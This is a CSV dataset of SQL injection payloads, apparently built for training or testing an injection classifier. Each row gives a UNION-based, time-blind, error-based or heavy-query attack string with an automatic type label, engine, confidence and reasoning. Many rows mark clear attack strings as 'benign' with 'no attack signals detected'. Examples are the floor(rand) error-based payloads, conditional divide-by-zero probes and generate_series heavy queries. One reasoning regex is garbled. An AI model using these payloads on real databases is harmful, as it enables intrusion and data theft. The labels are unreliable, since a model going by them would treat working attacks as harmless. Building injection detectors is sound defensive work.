id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25590,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ogwd' like 'ogwd",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25591,"-2784' ) ) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25592,"-8094 ) or elt ( 1032 = 1032,3623 ) and ( 4569 = 4569",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25593,"-2909'|| ( select 'qfeq' where 7062 = 7062 union all select 7062,7062,7062,7062,7062,7062--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25594,-3520%' or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25595,"1"" where 1618 = 1618 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25596,1' ) where 7478 = 7478,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25597,-8080' ) ) order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25598,"-2798'+ ( select 'emui' where 9565 = 9565 union all select 9565,9565,9565,9565--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25599,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25600,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25601,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'bgdp' = 'bgdp",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25602,1'|| ( select 'svnn' from dual where 8710 = 8710,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25603,end and ( 'jzlr' = 'jzlr,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25604,"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25605,"1', ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25606,1' ) as dpmh where 5281 = 5281 and 2006 = 2006,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25607,1' ) where 3767 = 3767 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25608,"1"" ) ) as nbdc where 4444 = 4444 union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25609,"select * from generate_series ( 2673,2673,case when ( 2673 = 1468 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25610,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'seyd' = 'seyd",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25611,"1 where 1186 = 1186 union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25612,"-1816"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dztr"" like ""dztr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25613,"-5425 where 5933 = 5933 union all select 5933,5933,5933--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25614,1'+ ( select 'jkgf' where 7487 = 7487,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25615,select ( case when ( 1082 = 6755 ) then 1082 else 1082* ( select 1082 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25616,"1%"" union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25617,"-7656"" ) ) ) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25618,"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25619,"1 ) ) as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25620,"-5062"" ) ) ) union all select 4125,4125--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25621,1 ) ) as xroy where 3274 = 3274,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25622,"1' ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25623,"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""buwe"" = ""buwe",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25624,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""ssfu"" = ""ssfu",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25625,1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( '%' = ',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25626,"iif ( 5519 = 4796,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
25627,"1"" ) ) as vhrq where 1690 = 1690 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25628,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,generic,0.50,Insufficient information to classify,1
25629,"1%"" ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25630,select ( case when ( 1726 = 4080 ) then 1726 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25631,"1"" ) where 7548 = 7548",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25632,1'+ ( select sijr where 7250 = 7250,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25633,"-1162"" ) ) as mhmh where 8710 = 8710 or make_set ( 4822 = 7598,7598 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25634,"1 ) ) ) union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25635,"1' ) ) as cbka where 3176 = 3176 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25636,"1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""ksrh"" = ""ksrh",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25637,"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25638,"-8661"" union all select 5731,5731--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25639,"1' ) ) and make_set ( 3793 = 8118,8118 ) and ( ( 'swvc' like 'swvc",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25640,"-3226'|| ( select 'ykdw' where 2617 = 2617 union all select 2617,2617--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25641,"-5513"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""ovmk"" like ""ovmk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25642,waitfor delay '0:0:5' and ( ( '%' = ',time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25643,"1"" ) and make_set ( 8403 = 8403,8899 ) and ( ""dhss"" = ""dhss",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25644,-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25645,1'+ ( select 'qxmo' where 9511 = 9511 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25646,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'cuat' = 'cuat",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25647,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""plqe"" = ""plqe",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25648,"1%' ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25649,"1' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25650,"-7963'+ ( select 'kxzh' where 7039 = 7039 union all select 7039,7039,7039,7039,7039,7039--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25651,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25652,"-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25653,1 where 7055 = 7055,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25654,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25655,"-2626%' ) or elt ( 7513 = 8586,8586 ) and ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25656,"1'|| ( select 'iwlj' where 8704 = 8704 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25657,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'vkde' = 'vkde",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25658,"1 ) as zbha where 9700 = 9700 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25659,"1"" ) where 5938 = 5938 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25660,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25661,"-3868' ) ) or make_set ( 6809 = 1236,1236 ) and ( ( 'evnj' = 'evnj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25662,"-2365 ) ) union all select 8190,8190#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25663,-2039' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25664,"1'+ ( select pwvr where 3028 = 3028 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25665,1' ) where 6440 = 6440 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25666,"1"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25667,"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25668,"1%"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25669,"-3436 ) or elt ( 1032 = 1032,3623 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25670,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25671,"1%' ) union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25672,"1%' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25673,"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""qgle"" like ""qgle",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25674,1'|| ( select 'lxyu' from dual where 5789 = 5789 union all select null#,union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
25675,"select sleep ( 5 ) and ( ( ( ""zlal"" = ""zlal",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25676,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25677,"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25678,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25679,"1'|| ( select 'drna' from dual where 5082 = 5082 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) ||'",time_blind,oracle,0.85,Signal match: benchmark → time_blind (P5); DB signature: oracle,1
25680,"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25681,"1 union all select null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25682,"1%"" ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25683,"-9356 or elt ( 1032 = 1032,3623 ) -- izgi",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25684,1 ) ) order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25685,"1' ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25686,"1"" ) ) as yosd where 1255 = 1255",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25687,"1%"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
